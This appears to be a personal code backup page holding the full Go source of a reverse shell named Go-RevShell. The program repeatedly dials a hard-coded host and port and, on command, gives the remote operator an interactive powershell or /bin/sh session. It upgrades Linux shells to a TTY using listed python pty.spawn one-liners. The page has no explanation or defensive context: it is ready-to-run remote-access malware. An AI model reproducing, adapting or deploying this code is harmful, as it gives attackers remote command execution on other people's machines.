# Sauvegarde du code du dimanche

    package main
    
    import (
    	"bufio"
    	"net"
    	"os/exec"
    	"runtime"
    	"strconv"
    	"strings"
    	"time"
    )
    
    const banner string = `
      ____                   ____                   ____    _              _   _
     / ___|   ___           |  _ \    ___  __   __ / ___|  | |__     ___  | | | |
    | |  _   / _ \   _____  | |_) |  / _ \ \ \ / / \___ \  | '_ \   / _ \ | | | |
    | |_| | | (_) | |_____| |  _ <  |  __/  \ V /   ___) | | | | | |  __/ | | | |
     \____|  \___/          |_| \_\  \___|   \_/   |____/  |_| |_|  \___| |_| |_|
    
    `
    
    var linuxPayloadsTTY = []string{`/usr/bin/env python -c 'import pty; pty.spawn("/bin/bash")'`, `/usr/bin/env python2.7 -c 'import pty; pty.    spawn("/bin/bash")'`, `/usr/bin/env python3 -c 'import pty; pty.spawn("/bin/bash")'`}
    
    func main() {
    	reverseShell("192.168.1.24", 1111)
    }
    
    func reverseShell(host string, port int) {
    	for {
    		connexion, err := net.Dial("tcp", host+":"+strconv.Itoa(port))
    		if err != nil {
    			time.Sleep(2 * time.Second)
    		} else {
    			connexion.Write([]byte(banner + "[+] Connected to " + connexion.LocalAddr().String() + "\nType \"quit\" to close the shell     properly or the process will die server side.\n"))
    			spawnInteractiveShell(connexion)
    		}
    	}
    }
    
    func spawnInteractiveShell(connexion net.Conn) {
    interactiveShell:
    	for {
    		connexion.Write([]byte("[Go-RevShell@" + connexion.LocalAddr().String() + "] > "))
    		clientEntry, _ := bufio.NewReader(connexion).ReadString('\n')
    		clientEntry = strings.TrimSuffix(clientEntry, "\n")
    		switch clientEntry {
    		case "quit":
    			break interactiveShell
    		case "shell":
    			if runtime.GOOS == "windows" {
    				spawnShell(connexion, "powershell.exe")
    			} else {
    				spawnLinuxTTYShell(connexion, "/bin/sh")
    			}
    		default:
    			connexion.Write([]byte("	[x] Type \"help\" to display this menu.\n	[x] Type \"quit\" to leave the interactive shell.\n	[x]     Type \"shell\" to spawn a shell on the server.\n"))
    		}
    	}
    	connexion.Close()
    }
    
    func spawnShell(connexion net.Conn, shellProgram string, arguments ...string) {
    	connexion.Write([]byte("[+] Welcome to Go-RevShell server side.\n[x] To get back to normal shell, please type \"exit\" and then press     enter two times. You can type any command.\n"))
    	shell := exec.Command(shellProgram, arguments...)
    	shell.Stdout, shell.Stderr, shell.Stdin = connexion, connexion, connexion
    	shell.Run()
    }
    
    func spawnLinuxTTYShell(connexion net.Conn, shellProgram string) {
    	payload := findWorkingPayload(connexion, shellProgram)
    	if payload != "" {
    		spawnShell(connexion, shellProgram, "-c", payload)
    	} else {
    		spawnShell(connexion, shellProgram)
    	}
    }
    
    func findWorkingPayload(connexion net.Conn, shellProgram string) string {
    	for _, payload := range linuxPayloadsTTY {
    		err := exec.Command(shellProgram, "-c", strings.Replace(payload, "/bin/bash", "/bin/bash -c exit 0", -1)).Run()
    		if err == nil {
    			return payload
    		}
    	}
    	return ""
    }
    